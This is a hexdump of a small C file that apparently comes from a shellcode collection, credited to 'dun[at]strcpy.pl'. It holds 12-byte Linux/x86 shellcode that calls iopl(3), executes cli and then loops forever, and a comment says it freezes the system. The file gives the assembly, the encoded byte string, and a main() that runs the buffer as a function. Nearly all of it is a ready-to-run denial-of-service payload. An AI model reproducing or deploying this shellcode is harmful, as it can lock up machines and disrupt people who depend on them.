00000000  2f 2a 0d 0a 20 20 3a 3a  3a 3a 3a 3a 3a 2d 2e 20  |/*..  :::::::-. |
00000010  20 20 2e 2e 2e 20 20 20  20 3a 3a 3a 3a 3a 3a 2e  |  ...    ::::::.|
00000020  20 20 20 20 3a 3a 3a 2e  0d 0a 20 20 20 3b 3b 2c  |    :::...   ;;,|
00000030  20 20 20 60 27 3b 2c 20  3b 3b 20 20 20 20 20 3b  |   `';, ;;     ;|
00000040  3b 3b 60 3b 3b 3b 3b 2c  20 20 60 3b 3b 3b 0d 0a  |;;`;;;;,  `;;;..|
00000050  20 20 20 60 5b 5b 20 20  20 20 20 5b 5b 5b 5b 27  |   `[[     [[[['|
00000060  20 20 20 20 20 5b 5b 5b  20 20 5b 5b 5b 5b 5b 2e  |     [[[  [[[[[.|
00000070  20 27 5b 5b 0d 0a 20 20  20 20 24 24 2c 20 20 20  | '[[..    $$,   |
00000080  20 24 24 24 24 20 20 20  20 20 20 24 24 24 20 20  | $$$$      $$$  |
00000090  24 24 24 20 22 59 24 63  24 24 0d 0a 20 20 20 20  |$$$ "Y$c$$..    |
000000a0  38 38 38 5f 2c 6f 38 50  27 38 38 20 20 20 20 2e  |888_,o8P'88    .|
000000b0  64 38 38 38 20 20 38 38  38 20 20 20 20 59 38 38  |d888  888    Y88|
000000c0  0d 0a 20 20 20 20 4d 4d  4d 4d 50 22 60 20 20 20  |..    MMMMP"`   |
000000d0  22 59 6d 6d 4d 4d 4d 4d  22 22 20 20 4d 4d 4d 20  |"YmmMMMM""  MMM |
000000e0  20 20 20 20 59 4d 0d 0a  0d 0a 20 09 5b 20 64 75  |    YM.... .[ du|
000000f0  6e 5b 61 74 5d 73 74 72  63 70 79 2e 70 6c 20 5d  |n[at]strcpy.pl ]|
00000100  0d 0a 20 20 0d 0a 20 5b  20 6c 69 6e 75 78 2f 78  |..  .. [ linux/x|
00000110  38 36 20 69 6f 70 6c 28  33 29 3b 20 61 73 6d 28  |86 iopl(3); asm(|
00000120  22 63 6c 69 22 29 3b 20  77 68 69 6c 65 28 31 29  |"cli"); while(1)|
00000130  7b 7d 20 31 32 20 62 79  74 65 73 20 5d 0d 0a 20  |{} 12 bytes ].. |
00000140  0d 0a 20 23 23 23 23 23  23 23 23 23 23 23 23 23  |.. #############|
00000150  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000180  23 23 0d 0a 20 20 20 69  6f 70 6c 28 33 29 3b 20  |##..   iopl(3); |
00000190  61 73 6d 28 22 63 6c 69  22 29 3b 20 77 68 69 6c  |asm("cli"); whil|
000001a0  65 28 31 29 7b 7d 0d 0a  20 20 20 2f 2f 20 2a 20  |e(1){}..   // * |
000001b0  74 68 69 73 20 63 6f 64  65 20 63 61 75 73 65 20  |this code cause |
000001c0  66 72 65 65 7a 65 69 6e  67 20 73 79 73 74 65 6d  |freezeing system|
000001d0  0d 0a 20 23 23 23 23 23  23 23 23 23 23 23 23 23  |.. #############|
000001e0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000210  23 23 23 23 0d 0a 20 0d  0a 20 5f 5f 61 73 6d 5f  |####.. .. __asm_|
00000220  5f 28 0d 0a 09 22 78 6f  72 6c 20 25 65 61 78 2c  |_(..."xorl %eax,|
00000230  20 25 65 61 78 5c 6e 22  0d 0a 09 22 70 75 73 68  | %eax\n"..."push|
00000240  6c 20 24 30 78 33 5c 6e  22 0d 0a 09 22 70 6f 70  |l $0x3\n"..."pop|
00000250  6c 20 25 65 62 78 5c 6e  22 0d 0a 09 22 6d 6f 76  |l %ebx\n"..."mov|
00000260  62 20 24 30 78 36 65 2c  25 61 6c 5c 6e 22 0d 0a  |b $0x6e,%al\n"..|
00000270  09 22 69 6e 74 20 24 30  78 38 30 5c 6e 22 0d 0a  |."int $0x80\n"..|
00000280  09 22 63 6c 69 5c 6e 22  0d 0a 09 22 78 31 3a 5c  |."cli\n"..."x1:\|
00000290  6e 22 0d 0a 09 22 6a 6d  70 20 78 31 5c 6e 22 0d  |n"..."jmp x1\n".|
000002a0  0a 20 29 3b 0d 0a 0d 0a  2a 2f 0d 0a 0d 0a 0d 0a  |. );....*/......|
000002b0  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
000002c0  3d 22 5c 78 33 31 5c 78  63 30 5c 78 36 61 5c 78  |="\x31\xc0\x6a\x|
000002d0  30 33 5c 78 35 62 5c 78  62 30 5c 78 36 65 5c 78  |03\x5b\xb0\x6e\x|
000002e0  63 64 5c 78 38 30 5c 78  66 61 5c 78 65 62 5c 78  |cd\x80\xfa\xeb\x|
000002f0  66 65 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |fe";....int main|
00000300  28 29 20 7b 0d 0a 0d 0a  09 76 6f 69 64 20 28 2a  |() {.....void (*|
00000310  73 63 29 28 29 3b 0d 0a  09 73 63 20 3d 20 28 76  |sc)();...sc = (v|
00000320  6f 69 64 20 2a 29 26 73  68 65 6c 6c 63 6f 64 65  |oid *)&shellcode|
00000330  3b 0d 0a 09 73 63 28 29  3b 0d 0a 09 0d 0a 72 65  |;...sc();.....re|
00000340  74 75 72 6e 20 30 3b 0d  0a 7d                    |turn 0;..}|
0000034a
